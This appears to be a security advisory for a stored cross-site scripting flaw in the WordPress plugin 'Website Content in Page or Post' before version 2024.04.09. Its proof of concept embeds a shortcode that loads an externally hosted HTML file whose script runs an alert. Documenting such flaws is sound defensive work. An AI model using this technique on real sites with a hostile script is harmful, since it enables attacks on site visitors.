## WordPress Plugin Vulnerabilities

# Website Content in Page or Post < 2024.04.09 - Contributor+ Stored Cross-Site Scripting

### Description

The plugin does not validate and escape some of its shortcode attributes before outputting them back in a page/post where the shortcode is embed, which could allow users with the contributor role and above to perform Stored Cross-Site Scripting attacks

### Proof of Concept

Create or edit a post and add a shortcode: [horshipsrectors\_get\_html\_curl URL], where URL is the URL for the page to be shown.
Now host a malicious html file on your server with html as follows:
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Alert Example</title>
</head>
<body>
<script>
window.onload = function() {
alert("Hello, this is an alert!");
};
</script>
</body>
</html>
Now provide the URL for the hosted html file and save the page.
XSS will be triggered whenever we visit the page.
